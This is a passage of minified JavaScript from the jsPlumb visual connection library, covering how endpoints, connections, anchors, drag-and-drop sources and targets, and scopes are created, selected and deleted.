r=[],a=e.isArray(t)||null!=t.length&&!e.isString(t)?t:[t],l=0,d=a.length;l<d;l++){i.source=s.getElement(a[l]),it(i.source);var u=H(i.source),c=z(i,u),h=rt(u,i.source).info.o;e.addToList(y,u,c),T||c.paint({anchorLoc:c.anchor.compute({xy:[h.left,h.top],wh:A[u],element:c,timestamp:k}),timestamp:k}),r.push(c)}return 1===r.length?r[0]:r},this.addEndpoints=function(t,n,o){for(var i=[],r=0,a=n.length;r<a;r++){var l=s.addEndpoint(t,n[r],o);e.isArray(l)?Array.prototype.push.apply(i,l):i.push(l)}return i},this.animate=function(t,n,o){if(!this.animationSupported)return!1;o=o||{};var i=s.getElement(t),r=H(i),a=p.animEvents.step,l=p.animEvents.complete;o[a]=e.wrap(o[a],function(){s.revalidate(r)}),o[l]=e.wrap(o[l],function(){s.revalidate(r)}),s.doAnimate(i,n,o)},this.checkCondition=function(t,n){var o=s.getListener(t),i=!0;if(o&&o.length>0){var r=Array.prototype.slice.call(arguments,1);try{for(var a=0,l=o.length;a<l;a++)i=i&&o[a].apply(o[a],r)}catch(n){e.log(s,"cannot check condition ["+t+"]"+n)}}return i},this.connect=function(t,n){var o,i=R(t,n);if(i){if(null==i.source&&null==i.sourceEndpoint)return void e.log("Cannot establish connection - source does not exist");if(null==i.target&&null==i.targetEndpoint)return void e.log("Cannot establish connection - target does not exist");it(i.source),o=G(i),U(o,i)}return o};var W=[{el:"source",elId:"sourceId",epDefs:"sourceEndpointDefinitions"},{el:"target",elId:"targetId",epDefs:"targetEndpointDefinitions"}],X=function(t,e,n,o){var i,r,s,a=W[n],l=t[a.elId],d=(t[a.el],t.endpoints[n]),u={index:n,originalSourceId:0===n?l:t.sourceId,newSourceId:t.sourceId,originalTargetId:1===n?l:t.targetId,newTargetId:t.targetId,connection:t};if(e.constructor===p.Endpoint)i=e,i.addConnection(t),e=i.element;else if(r=H(e),s=this[a.epDefs][r],r===t[a.elId])i=null;else if(s)for(var c in s){if(!s[c].enabled)return;i=null!=s[c].endpoint&&s[c].endpoint._jsPlumb?s[c].endpoint:this.addEndpoint(e,s[c].def),s[c].uniqueEndpoint&&(s[c].endpoint=i),i.addConnection(t)}else i=t.makeEndpoint(0===n,e,r);return null!=i&&(d.detachFromConnection(t),t.endpoints[n]=i,t[a.el]=i.element,t[a.elId]=i.elementId,u[0===n?"newSourceId":"newTargetId"]=i.elementId,Z(u),o||t.repaint()),u.element=e,u}.bind(this);this.setSource=function(t,e,n){var o=X(t,e,0,n);this.anchorManager.sourceChanged(o.originalSourceId,o.newSourceId,t,o.el)},this.setTarget=function(t,e,n){var o=X(t,e,1,n);this.anchorManager.updateOtherEndpoint(o.originalSourceId,o.originalTargetId,o.newTargetId,t)},this.deleteEndpoint=function(t,e,n){var o="string"==typeof t?P[t]:t;return o&&s.deleteObject({endpoint:o,dontUpdateHover:e,deleteAttachedObjects:n}),s},this.deleteEveryEndpoint=function(){var t=s.setSuspendDrawing(!0);for(var e in y){var n=y[e];if(n&&n.length)for(var o=0,i=n.length;o<i;o++)s.deleteEndpoint(n[o],!0)}y={},E={},P={},x={},C={},s.anchorManager.reset();var r=s.getDragManager();return r&&r.reset(),t||s.setSuspendDrawing(!1),s};var Y=function(t,e,n){var o=s.Defaults.ConnectionType||s.getDefaultConnectionType(),i=t.constructor===o?{connection:t,source:t.source,target:t.target,sourceId:t.sourceId,targetId:t.targetId,sourceEndpoint:t.endpoints[0],targetEndpoint:t.endpoints[1]}:t;e&&s.fire("connectionDetached",i,n),s.fire("internal.connectionDetached",i,n),s.anchorManager.connectionDetached(i)},Z=s.fireMoveEvent=function(t,e){s.fire("connectionMoved",t,e)};this.unregisterEndpoint=function(t){t._jsPlumb.uuid&&(P[t._jsPlumb.uuid]=null),s.anchorManager.deleteEndpoint(t);for(var e in y){var n=y[e];if(n){for(var o=[],i=0,r=n.length;i<r;i++)n[i]!==t&&o.push(n[i]);y[e]=o}y[e].length<1&&delete y[e]}};var q="isDetachAllowed";this.deleteConnection=function(t,n){return!(null==t||(n=n||{},!n.force&&!e.functionChain(!0,!1,[[t.endpoints[0],q,[t]],[t.endpoints[1],q,[t]],[t,q,[t]],[s,"checkCondition",["beforeDetach",t]]]))||(t.setHover(!1),Y(t,!t.pending&&!1!==n.fireEvent,n.originalEvent),t.endpoints[0].detachFromConnection(t),t.endpoints[1].detachFromConnection(t),e.removeWithFunction(j,function(e){return t.id===e.id}),t.cleanup(),t.destroy(),0))},this.deleteEveryConnection=function(t){t=t||{};var e=j.length,n=0;return s.batch(function(){for(var o=0;o<e;o++)n+=s.deleteConnection(j[0],t)?1:0}),n},this.deleteConnectionsForElement=function(t,e){e=e||{},t=s.getElement(t);var n=H(t),o=y[n];if(o&&o.length)for(var i=0,r=o.length;i<r;i++)o[i].deleteEveryConnection(e);return s},this.deleteObject=function(t){var n={endpoints:{},connections:{},endpointCount:0,connectionCount:0},o=!1!==t.deleteAttachedObjects,i=function(e){null!=e&&null==n.connections[e.id]&&(t.dontUpdateHover||null==e._jsPlumb||e.setHover(!1),n.connections[e.id]=e,n.connectionCount++)};t.connection?i(t.connection):function(e){if(null!=e&&null==n.endpoints[e.id]&&(t.dontUpdateHover||null==e._jsPlumb||e.setHover(!1),n.endpoints[e.id]=e,n.endpointCount++,o))for(var r=0;r<e.connections.length;r++){var s=e.connections[r];i(s)}}(t.endpoint);for(var r in n.connections){var a=n.connections[r];if(a._jsPlumb){e.removeWithFunction(j,function(t){return a.id===t.id}),Y(a,!1!==t.fireEvent&&!a.pending,t.originalEvent);var l=null==t.deleteAttachedObjects?null:!t.deleteAttachedObjects;a.endpoints[0].detachFromConnection(a,null,l),a.endpoints[1].detachFromConnection(a,null,l),a.cleanup(!0),a.destroy(!0)}}for(var d in n.endpoints){var u=n.endpoints[d];u._jsPlumb&&(s.unregisterEndpoint(u),u.cleanup(!0),u.destroy(!0))}return n},this.draggable=function(t,n){var o;return a(function(t){(o=g(t)).el&&function(t,n,o,i,r){if(!p.headless&&null!=n&&n&&p.isDragSupported(t,s)){var a=o||s.Defaults.DragOptions;if(a=p.extend({},a),p.isAlreadyDraggable(t,s))o.force&&s.initDraggable(t,a);else{var l=p.dragEvents.drag,d=p.dragEvents.stop,u=p.dragEvents.start,c=!1;rt(i,t),a[u]=e.wrap(a[u],function(){if(s.setHoverSuspended(!0),s.select({source:t}).addClass(s.elementDraggingClass+" "+s.sourceElementDraggingClass,!0),s.select({target:t}).addClass(s.elementDraggingClass+" "+s.targetElementDraggingClass,!0),s.setConnectionBeingDragged(!0),a.canDrag)return o.canDrag()},!1),a[l]=e.wrap(a[l],function(){var e=s.getUIPosition(arguments,s.getZoom());null!=e&&(F(t,e,null,!0),c&&s.addClass(t,"jtk-dragged"),c=!0)}),a[d]=e.wrap(a[d],function(){for(var t,e=arguments[0].selection,n=0;n<e.length;n++)o=e[n],null!=o[1]&&(t=s.getUIPosition([{el:o[2].el,pos:[o[1].left,o[1].top]}]),F(o[2].el,t)),s.removeClass(o[0],"jtk-dragged"),s.select({source:o[2].el}).removeClass(s.elementDraggingClass+" "+s.sourceElementDraggingClass,!0),s.select({target:o[2].el}).removeClass(s.elementDraggingClass+" "+s.targetElementDraggingClass,!0),s.getDragManager().dragEnded(o[2].el);var o;c=!1,s.setHoverSuspended(!1),s.setConnectionBeingDragged(!1)});var h=H(t);S[h]=!0;var f=S[h];a.disabled=null!=f&&!f,s.initDraggable(t,a),s.getDragManager().register(t),r&&s.fire("elementDraggable",{el:t,options:a})}}}(o.el,!0,n,o.id,!0)},t),s},this.droppable=function(t,e){var n;return(e=e||{}).allowLoopback=!1,a(function(t){(n=g(t)).el&&s.initDroppable(n.el,e)},t),s};var J=function(t,e,n){return function(){return function(t,e,n,o){for(var i=0,r=t.length;i<r;i++)t[i][e].apply(t[i],n);return o(t)}(t,e,arguments,n)}},$=function(t,e){return function(){return function(t,e,n){for(var o=[],i=0,r=t.length;i<r;i++)o.push([t[i][e].apply(t[i],n),t[i]]);return o}(t,e,arguments)}},K=function(t,e){var n=[];if(t)if("string"==typeof t){if("*"===t)return t;n.push(t)}else if(e)n=t;else if(t.length)for(var o=0,i=t.length;o<i;o++)n.push(g(t[o]).id);else n.push(g(t).id);return n},Q=function(t,e,n){return"*"===t||(t.length>0?-1!==t.indexOf(e):!n)};this.getConnections=function(t,e){t?t.constructor===String&&(t={scope:t}):t={};for(var n=t.scope||s.getDefaultScope(),o=K(n,!0),i=K(t.source),r=K(t.target),a=!e&&o.length>1?{}:[],l=function(t,n){if(!e&&o.length>1){var i=a[t];null==i&&(i=a[t]=[]),i.push(n)}else a.push(n)},d=0,u=j.length;d<u;d++){var c=j[d],h=c.proxies&&c.proxies[0]?c.proxies[0].originalEp.elementId:c.sourceId,p=c.proxies&&c.proxies[1]?c.proxies[1].originalEp.elementId:c.targetId;Q(o,c.scope)&&Q(i,h)&&Q(r,p)&&l(c.scope,c)}return a};var tt=function(t,e){var n,o,i,r,s,a={length:t.length,each:(r=t,s=e,function(t){for(var e=0,n=r.length;e<n;e++)t(r[e]);return s(r)}),get:(i=t,function(t){return i[t]})},l=["setHover","removeAllOverlays","setLabel","addClass","addOverlay","removeOverlay","removeOverlays","showOverlay","hideOverlay","showOverlays","hideOverlays","setPaintStyle","setHoverPaintStyle","setSuspendEvents","setParameter","setParameters","setVisible","repaint","addType","toggleType","removeType","removeClass","setType","bind","unbind"],d=["getLabel","getOverlay","isHover","getParameter","getParameters","getPaintStyle","getHoverPaintStyle","isVisible","hasType","getType","isSuspendEvents"];for(n=0,o=l.length;n<o;n++)a[l[n]]=J(t,l[n],e);for(n=0,o=d.length;n<o;n++)a[d[n]]=$(t,d[n]);return a},et=function(t){var e=tt(t,et);return p.extend(e,{setDetachable:J(t,"setDetachable",et),setReattach:J(t,"setReattach",et),setConnector:J(t,"setConnector",et),delete:function(){for(var e=0,n=t.length;e<n;e++)s.deleteConnection(t[e])},isDetachable:$(t,"isDetachable"),isReattach:$(t,"isReattach")})},nt=function(t){var e=tt(t,nt);return p.extend(e,{setEnabled:J(t,"setEnabled",nt),setAnchor:J(t,"setAnchor",nt),isEnabled:$(t,"isEnabled"),deleteEveryConnection:function(){for(var e=0,n=t.length;e<n;e++)t[e].deleteEveryConnection()},delete:function(){for(var e=0,n=t.length;e<n;e++)s.deleteEndpoint(t[e])}})};this.select=function(t){return(t=t||{}).scope=t.scope||"*",et(t.connections||s.getConnections(t,!0))},this.selectEndpoints=function(t){(t=t||{}).scope=t.scope||"*";var e=!t.element&&!t.source&&!t.target,n=e?"*":K(t.element),o=e?"*":K(t.source),i=e?"*":K(t.target),r=K(t.scope,!0),s=[];for(var a in y){var l=Q(n,a,!0),d=Q(o,a,!0),u="*"!==o,c=Q(i,a,!0),h="*"!==i;if(l||d||c)t:for(var p=0,f=y[a].length;p<f;p++){var g=y[a][p];if(Q(r,g.scope,!0)){var _=u&&o.length>0&&!g.isSource,b=h&&i.length>0&&!g.isTarget;if(_||b)continue t;s.push(g)}}}return nt(s)},this.getAllConnections=function(){return j},this.getDefaultScope=function(){return D},this.getEndpoint=L,this.getEndpoints=function(t){return y[g(t).id]||[]},this.getDefaultEndpointType=function(){return p.Endpoint},this.getDefaultConnectionType=function(){return p.Connection},this.getId=H,this.appendElement=O;var ot=!1;this.isHoverSuspended=function(){return ot},this.setHoverSuspended=function(t){ot=t},this.hide=function(t,e){return B(t,"none",e),s},this.idstamp=M;var it=function(t){if(!b&&t){var e=s.getElement(t);e.offsetParent&&s.setContainer(e.offsetParent)}},rt=s.manage=function(t,e,n){return E[t]||(E[t]={el:e,endpoints:[],connections:[]},E[t].info=st({elId:t,timestamp:k}),n||s.fire("manageElement",{id:t,info:E[t].info,el:e})),E[t]},st=function(t){var e,n=t.timestamp,o=t.recalc,i=t.offset,r=t.elId;return T&&!n&&(n=k),!o&&n&&n===C[r]?{o:t.offset||x[r],s:A[r]}:(o||!i&&null==x[r]?null!=(e=E[r]?E[r].el:null)&&(A[r]=s.getSize(e),x[r]=s.getOffset(e),C[r]=n):(x[r]=i||x[r],null==A[r]&&null!=(e=E[r].el)&&(A[r]=s.getSize(e)),C[r]=n),x[r]&&!x[r].right&&(x[r].right=x[r].left+A[r][0],x[r].bottom=x[r].top+A[r][1],x[r].width=A[r][0],x[r].height=A[r][1],x[r].centerx=x[r].left+x[r].width/2,x[r].centery=x[r].top+x[r].height/2),{o:x[r],s:A[r]})};this.updateOffset=st,this.init=function(){w||(s.Defaults.Container&&s.setContainer(s.Defaults.Container),s.anchorManager=new t.jsPlumb.AnchorManager({jsPlumbInstance:s}),w=!0,s.fire("ready",s))}.bind(this),this.log=m,this.jsPlumbUIComponent=d,this.makeAnchor=function(){var n,o=function(e,n){if(t.jsPlumb.Anchors[e])return new t.jsPlumb.Anchors[e](n);if(!s.Defaults.DoNotThrowErrors)throw{msg:"jsPlumb: unknown anchor type '"+e+"'"}};if(0===arguments.length)return null;var i=arguments[0],r=arguments[1],a=(arguments[2],null);if(i.compute&&i.getOrientation)return i;if("string"==typeof i)a=o(arguments[0],{elementId:r,jsPlumbInstance:s});else if(e.isArray(i))if(e.isArray(i[0])||e.isString(i[0]))2===i.length&&e.isObject(i[1])?e.isString(i[0])?(n=t.jsPlumb.extend({elementId:r,jsPlumbInstance:s},i[1]),a=o(i[0],n)):(n=t.jsPlumb.extend({elementId:r,jsPlumbInstance:s,anchors:i[0]},i[1]),a=new t.jsPlumb.DynamicAnchor(n)):a=new p.DynamicAnchor({anchors:i,selector:null,elementId:r,jsPlumbInstance:s});else{var l={x:i[0],y:i[1],orientation:i.length>=4?[i[2],i[3]]:[0,0],offsets:i.length>=6?[i[4],i[5]]:[0,0],elementId:r,jsPlumbInstance:s,cssClass:7===i.length?i[6]:null};(a=new t.jsPlumb.Anchor(l)).clone=function(){return new t.jsPlumb.Anchor(l)}}return a.id||(a.id="anchor_"+M()),a},this.makeAnchors=function(n,o,i){for(var r=[],a=0,l=n.length;a<l;a++)"string"==typeof n[a]?r.push(t.jsPlumb.Anchors[n[a]]({elementId:o,jsPlumbInstance:i})):e.isArray(n[a])&&r.push(s.makeAnchor(n[a],o,i));return r},this.makeDynamicAnchor=function(e,n){return new t.jsPlumb.DynamicAnchor({anchors:e,selector:n,elementId:null,jsPlumbInstance:s})},this.targetEndpointDefinitions={},this.sourceEndpointDefinitions={};var at=function(n,o,i,r,a){var l=new d(o),u=o._jsPlumb.EndpointDropHandler({jsPlumb:s,enabled:function(){return n.def.enabled},isFull:function(){var t=s.select({target:n.id}).length;return n.def.maxConnections>0&&t>=n.def.maxConnections},element:n.el,elementId:n.id,isSource:r,isTarget:a,addClass:function(t){s.addClass(n.el,t)},removeClass:function(t){s.removeClass(n.el,t)},onDrop:function(t){t.endpoints[0].anchor.unlock()},isDropAllowed:function(){return l.isDropAllowed.apply(l,arguments)},isRedrop:function(t){return null!=t.suspendedElement&&null!=t.suspendedEndpoint&&t.suspendedEndpoint.element===n.el},getEndpoint:function(e){var i=n.def.endpoint;if(null==i||null==i._jsPlumb){var r=s.deriveEndpointAndAnchorSpec(e.getType().join(" "),!0),a=r.endpoints?t.jsPlumb.extend(o,{endpoint:n.def.def.endpoint||r.endpoints[1]}):o;r.anchors&&(a=t.jsPlumb.extend(a,{anchor:n.def.def.anchor||r.anchors[1]})),(i=s.addEndpoint(n.el,a))._mtNew=!0}if(o.uniqueEndpoint&&(n.def.endpoint=i),i.setDeleteOnEmpty(!0),e.isDetachable()&&i.initDraggable(),null!=i.anchor.positionFinder){var l=s.getUIPosition(arguments,s.getZoom()),d=s.getOffset(n.el),u=s.getSize(n.el),c=null==l?[0,0]:i.anchor.positionFinder(l,d,u,i.anchor.constructorParams);i.anchor.x=c[0],i.anchor.y=c[1]}return i},maybeCleanup:function(t){t._mtNew&&0===t.connections.length?s.deleteObject({endpoint:t}):delete t._mtNew}}),c=t.jsPlumb.dragEvents.drop;return i.scope=i.scope||o.scope||s.Defaults.Scope,i[c]=e.wrap(i[c],u,!0),i.rank=o.rank||0,a&&(i[t.jsPlumb.dragEvents.over]=function(){return!0}),!1===o.allowLoopback&&(i.canDrop=function(t){return t.getDragElement()._jsPlumbRelatedElement!==n.el}),s.initDroppable(n.el,i,"internal"),u};this.makeTarget=function(e,n,o){var i=t.jsPlumb.extend({_jsPlumb:this},o);t.jsPlumb.extend(i,n);for(var r=i.maxConnections||-1,a=function(e){var n=g(e),o=n.id,a=t.jsPlumb.extend({},i.dropOptions||{}),l=i.connectionType||"default";this.targetEndpointDefinitions[o]=this.targetEndpointDefinitions[o]||{},it(o),n.el._isJsPlumbGroup&&null==a.rank&&(a.rank=-1);var d={def:t.jsPlumb.extend({},i),uniqueEndpoint:i.uniqueEndpoint,maxConnections:r,enabled:!0};i.createEndpoint&&(d.uniqueEndpoint=!0,d.endpoint=s.addEndpoint(e,d.def),d.endpoint.setDeleteOnEmpty(!1)),n.def=d,this.targetEndpointDefinitions[o][l]=d,at(n,i,a,!0===i.isSource,!0),n.el._katavorioDrop[n.el._katavorioDrop.length-1].targetDef=d}.bind(this),l=e.length&&e.constructor!==String?e:[e],d=0,u=l.length;d<u;d++)a(l[d]);return this},this.unmakeTarget=function(t,e){var n=g(t);return s.destroyDroppable(n.el,"internal"),e||delete this.targetEndpointDefinitions[n.id],this},this.makeSource=function(n,o,i){var r=t.jsPlumb.extend({_jsPlumb:this},i);t.jsPlumb.extend(r,o);var a=r.connectionType||"default",l=s.deriveEndpointAndAnchorSpec(a);r.endpoint=r.endpoint||l.endpoints[0],r.anchor=r.anchor||l.anchors[0];for(var d=r.maxConnections||-1,u=r.onMaxConnections,c=function(o){var i=o.id,l=this.getElement(o.el);this.sourceEndpointDefinitions[i]=this.sourceEndpointDefinitions[i]||{},it(i);var c={def:t.jsPlumb.extend({},r),uniqueEndpoint:r.uniqueEndpoint,maxConnections:d,enabled:!0};r.createEndpoint&&(c.uniqueEndpoint=!0,c.endpoint=s.addEndpoint(n,c.def),c.endpoint.setDeleteOnEmpty(!1)),this.sourceEndpointDefinitions[i][a]=c,o.def=c;var h=t.jsPlumb.dragEvents.stop,p=t.jsPlumb.dragEvents.drag,g=t.jsPlumb.extend({},r.dragOptions||{}),_=g.drag,b=g.stop,v=null,m=!1;g.scope=g.scope||r.scope,g[p]=e.wrap(g[p],function(){_&&_.apply(this,arguments),m=!1}),g[h]=e.wrap(g[h],function(){if(b&&b.apply(this,arguments),this.currentlyDragging=!1,null!=v._jsPlumb){var t=r.anchor||this.Defaults.Anchor,e=v.anchor,n=v.connections[0],o=this.makeAnchor(t,i,this),a=v.element;if(null!=o.positionFinder){var l=s.getOffset(a),d=this.getSize(a),u={left:l.left+e.x*d[0],top:l.top+e.y*d[1]},c=o.positionFinder(u,l,d,o.constructorParams);o.x=c[0],o.y=c[1]}v.setAnchor(o,!0),v.repaint(),this.repaint(v.elementId),null!=n&&this.repaint(n.targetId)}}.bind(this));var w=function(n){if(3!==n.which&&2!==n.button){var c=this.sourceEndpointDefinitions[i][a];if(c.enabled){if(i=this.getId(this.getElement(o.el)),r.filter&&!1===(e.isString(r.filter)?function(t,e,n,o,i){for(var r=t.target||t.srcElement,s=!1,a=o.getSelector(e,n),l=0;l<a.length;l++)if(a[l]===r){s=!0;break}return i?!s:s}(n,o.el,r.filter,this,r.filterExclude):r.filter(n,o.el)))return;var h=this.select({source:i}).length;if(c.maxConnections>=0&&h>=c.maxConnections)return u&&u({element:o.el,maxConnections:d},n),!1;var p=t.jsPlumb.getPositionOnElement(n,l,f),_={};t.jsPlumb.extend(_,r),_.isTemporarySource=!0,_.anchor=[p[0],p[1],0,0],_.dragOptions=g,c.def.scope&&(_.scope=c.def.scope),v=this.addEndpoint(i,_),m=!0,v.setDeleteOnEmpty(!0),c.uniqueEndpoint&&(c.endpoint?v.finalEndpoint=c.endpoint:(c.endpoint=v,v.setDeleteOnEmpty(!1)));var b=function(){s.off(v.canvas,"mouseup",b),s.off(o.el,"mouseup",b),m&&(m=!1,s.deleteEndpoint(v))};s.on(v.canvas,"mouseup",b),s.on(o.el,"mouseup",b);var w={};if(c.def.extract)for(var j in c.def.extract){var y=(n.srcElement||n.target).getAttribute(j);y&&(w[c.def.extract[j]]=y)}s.trigger(v.canvas,"mousedown",n,w),e.consume(n)}}}.bind(this);this.on(o.el,"mousedown",w),c.trigger=w,r.filter&&(e.isString(r.filter)||e.isFunction(r.filter))&&s.setDragFilter(o.el,r.filter);var j=t.jsPlumb.extend({},r.dropOptions||{});at(o,r,j,!0,!0===r.isTarget)}.bind(this),h=n.length&&n.constructor!==String?n:[n],p=0,_=h.length;p<_;p++)c(g(h[p]));return this},this.unmakeSource=function(t,e,n){var o=g(t);s.destroyDroppable(o.el,"internal");var i=this.sourceEndpointDefinitions[o.id];if(i)for(var r in i)if(null==e||e===r){var a=i[r].trigger;a&&s.off(o.el,"mousedown",a),n||delete this.sourceEndpointDefinitions[o.id][r]}return this},this.unmakeEverySource=function(){for(var t in this.sourceEndpointDefinitions)s.unmakeSource(t,null,!0);return this.sourceEndpointDefinitions={},this};var lt=function(t,n,o){n=e.isArray(n)?n:[n];var i=H(t);o=o||"default";for(var r=0;r<n.length;r++){var s=this[n[r]][i];if(s&&s[o])return s[o].def.scope||this.Defaults.Scope}}.bind(this),dt=function(t,n,o,i){o=e.isArray(o)?o:[o];var r=H(t);i=i||"default";for(var s=0;s<o.length;s++){var a=this[o[s]][r];a&&a[i]&&(a[i].def.scope=n)}}.bind(this);this.getScope=function(t,e){return lt(t,["sourceEndpointDefinitions","targetEndpointDefinitions"])},this.getSourceScope=function(t){return lt(t,"sourceEndpointDefinitions")},this.getTargetScope=function(t){return lt(t,"targetEndpointDefinitions")},this.setScope=function(t,e,n){this.setSourceScope(t,e,n),this.setTargetScope(t,e,n)},this.setSourceScope=function(t,e,n){dt(t,e,"sourceEndpointDefinitions",n),this.setDragScope(t,e)},this.setTargetScope=function(t,e,n){dt(t,e,"targetEndpointDefinitions",n),this.setDropScope(t,e)},this.unmakeEveryTarget=function(){for(var t in this.targetEndpointDefinitions)s.unmakeTarget(t,!0);return this.targetEndpointDefinitions={},this};var ut=function(t,n,o,i,r){var a,l,d,u="source"===t?this.sourceEndpointDefinitions:this.targetEndpointDefinitions;if(r=r||"default",n.length&&!e.isString(n)){a=[];for(var c=0,h=n.length;c<h;c++)l=g(n[c]),u[l.id]&&u[l.id][r]&&(a[c]=u[l.id][r].enabled,d=i?!a[c]:o,u[l.id][r].enabled=d,s[d?"removeClass":"addClass"](l.el,"jtk-"+t+"-disabled"))}else{var p=(l=g(n)).id;u[p]&&u[p][r]&&(a=u[p][r].enabled,d=i?!a:o,u[p][r].enabled=d,s[d?"removeClass":"addClass"](l.el,"jtk-"+t+"-disabled"))}return a}.bind(this),ct=function(t,n){return e.isString(t)||!t.length?n.apply(this,[t]):t.length?n.apply(this,[t[0]]):void 0}.bind(this);this.toggleSourceEnabled=function(t,e){return ut("source",t,null,!0,e),this.isSourceEnabled(t,e)},this.setSourceEnabled=function(t,e,n){return ut("source",t,e,null,n)},this.isSource=function(t,e){return e=e||"default",ct(t,function(t){var n=this.sourceEndpointDefinitions[g(t).id];return null!=n&&null!=n[e]}.bind(this))},this.isSourceEnabled=function(t,e){return e=e||"default",ct(t,function(t){var n=this.sourceEndpointDefinitions[g(t).id];return n&&n[e]&&!0===n[e].enabled}.bind(this))},this.toggleTargetEnabled=function(t,e){return ut("target",t,null,!0,e),this.isTargetEnabled(t,e)},this.isTarget=function(t,e){return e=e||"default",ct(t,function(t){var n=this.targetEndpointDefinitions[g(t).id];return null!=n&&null!=n[e]}.bind(this))},this.isTargetEnabled=function(t,e){return e=e||"default",ct(t,function(t){var n=this.targetEndpointDefinitions[g(t).id];return n&&n[e]&&!0===n[e].enabled}.bind(this))},this.setTargetEnabled=function(t,e,n){return ut("target",t,e,null,n)},this.ready=function(t){s.bind("ready",t)};var ht=function(t,e){if("object"==typeof t&&t.length)for(var n=0,o=t.length;n<o;n++)e(t[n]);else e(t);return s};this.repaint=function(t,e,n){return ht(t,function(t){F(t,e,n)})},this.revalidate=function(t,e,n){return ht(t,function(t){var o=n?t:s.getId(t);s.updateOffset({elId:o,recalc:!0,timestamp:e});var i=s.getDragManager();i&&i.updateOffsets(o),s.repaint(t)})},this.repaintEverything=function(){var t,e=n();for(t in y)s.updateOffset({elId:t,recalc:!0,timestamp:e});for(t in y)F(t,null,e);return this},this.removeAllEndpoints=function(t,e,n){n=n||[];var o=function(t){var i,r,a=g(t),l=y[a.id];if(l)for(n.push(a),i=0,r=l.length;i<r;i++)s.deleteEndpoint(l[i],!1);if(delete y[a.id],e&&a.el&&3!==a.el.nodeType&&8!==a.el.nodeType)for(i=0,r=a.el.childNodes.length;i<r;i++)o(a.el.childNodes[i])};return o(t),this};var pt=function(t,e){s.removeAllEndpoints(t.id,!0,e);for(var n=s.getDragManager(),o=function(t){n&&n.elementRemoved(t.id),s.anchorManager.clearFor(t.id),s.anchorManager.removeFloatingConnection(t.id),s.isSource(t.el)&&s.unmakeSource(t.el),s.isTarget(t.el)&&s.unmakeTarget(t.el),s.destroyDraggable(t.el),s.destroyDroppable(t.el),delete s.floatingConnections[t.id],delete E[t.id],delete x[t.id],t.el&&(s.removeElement(t.el),t.el._jsPlumb=null)},i=1;i<e.length;i++)o(e[i]);o(t)};this.remove=function(t,e){var n=g(t),o=[];return n.text?n.el.parentNode.removeChild(n.el):n.id&&s.batch(function(){pt(n,o)},!0===e),s},this.empty=function(t,e){var n=[],o=function(t,e){var i=g(t);if(i.text)i.el.parentNode.removeChild(i.el);else if(i.el){for(;i.el.childNodes.length>0;)o(i.el.childNodes[0]);e||pt(i,n)}};return s.batch(function(){o(t,!0)},!1===e),s},this.reset=function(t){s.silently(function(){ot=!1,s.removeAllGroups(),s.removeGroupManager(),s.deleteEveryEndpoint(),t||s.unbind(),this.targetEndpointDefinitions={},this.sourceEndpointDefinitions={},j.length=0,this.doReset&&this.doReset()}.bind(this))};var ft=function(t){t.canvas&&t.canvas.parentNode&&t.canvas.parentNode.removeChild(t.canvas),t.cleanup(),t.destroy()};this.clear=function(){s.select().each(ft),s.selectEndpoints().each(ft),y={},P={}},this.setDefaultScope=function(t){return D=t,s},this.setDraggable=function(t,e){return p.each(t,function(t){s.isDragSupported(t)&&(S[s.getAttribute(t,"id")]=e,s.setElementDraggable(t,e))})},this.deriveEndpointAndAnchorSpec=function(t,e){for(var n=((e?"":"default ")+t).split(/[\s]/),o=null,i=null,r=null,a=null,l=0;l<n.length;l++){var d=s.getType(n[l],"connection");d&&(d.endpoints&&(o=d.endpoints),d.endpoint&&(i=d.endpoint),d.anchors&&(a=d.anchors),d.anchor&&(r=d.anchor))}return{endpoints:o||[i,i],anchors:a||[r,r]}},this.setId=function(t,n,o){var i;e.isString(t)?i=t:(t=this.getElement(t),i=this.getId(t));var r=this.getConnections({source:i,scope:"*"},!0),s=this.getConnections({target:i,scope:"*"},!0);n=""+n,o?t=this.getElement(n):(t=this.getElement(i),this.setAttribute(t,"id",n)),y[n]=y[i]||[];for(var a=0,l=y[n].length;a<l;a++)y[n][a].setElementId(n),y[n][a].setReferenceElement(t);delete y[i],this.sourceEndpointDefinitions[n]=this.sourceEndpointDefinitions[i],delete this.sourceEndpointDefinitions[i],this.targetEndpointDefinitions[n]=this.targetEndpointDefinitions[i],delete this.targetEndpointDefinitions[i],this.anchorManager.changeId(i,n);var d=this.getDragManager();d&&d.changeId(i,n),E[n]=E[i],delete E[i];var u=function(e,o,i){for(var r=0,s=e.length;r<s;r++)e[r].endpoints[o].setElementId(n),e[r].endpoints[o].setReferenceElement(t),e[r][i+"Id"]=n,e[r][i]=t};u(r,0,"source"),u(s,1,"target"),this.repaint(n)},this.setDebugLog=function(t){m=t},this.setSuspendDrawing=function(t,e){var n=T;return T=t,k=t?(new Date).getTime():null,e&&this.repaintEverything(),n},this.isSuspendDrawing=function(){return T},this.getSuspendedAt=function(){return k},this.batch=function(t,n){var o=this.isSuspendDrawing();o||this.setSuspendDrawing(!0);try{t()}catch(t){e.log("Function run while suspended failed",t)}o||this.setSuspendDrawing(!1,!n)},this.doWhileSuspended=this.batch,this.getCachedData=function(t){var e=x[t];return e?{o:e,s:A[t]}:st({elId:t})},this.timestamp=n,this.show=function(t,e){return B(t,"block",e),s},this.toggleVisible=function(t,e){var n=null;e&&(n=function(t){var e=t.isVisible();t.setVisible(!e)}),V(t,function(t){var e=t.isVisible();t.setVisible(!e)},n)},this.toggleDraggable=function(t){var e;return p.each(t,function(t){var n=s.getAttribute(t,"id");return e=!(e=null!=S[n]&&S[n]),S[n]=e,s.setDraggable(t,e),e}.bind(this)),e},this.addListener=this.bind;var gt=[];this.registerFloatingConnection=function(t,n,o){gt[t.id]=n,e.addToList(y,t.id,o)},this.getFloatingConnectionFor=function(t){return gt[t]}};e.extend(t.jsPlumbInstance,e.EventGenerator,{setAttribute:function(t,e,n){this.setAttribute(t,e,n)},getAttribute:function(e,n){return this.getAttribute(t.jsPlumb.getElement(e),n)},convertToFullOverlaySpec:function(t){return e.isString(t)&&(t=[t,{}]),t[1].id=t[1].id||e.uuid(),t},registerConnectionType:function(e,n){if(this._connectionTypes[e]=t.jsPlumb.extend({},n),n.overlays){for(var o={},i=0;i<n.overlays.length;i++){var r=this.convertToFullOverlaySpec(n.overlays[i]);o[r[1].id]=r}this._connectionTypes[e].overlays=o}},registerConnectionTypes:function(t){for(var e in t)this.registerConnectionType(e,t[e])},registerEndpointType:function(e,n){if(this._endpointTypes[e]=t.jsPlumb.extend({},n),n.overlays){for(var o={},i=0;i<n.overlays.length;i++){var 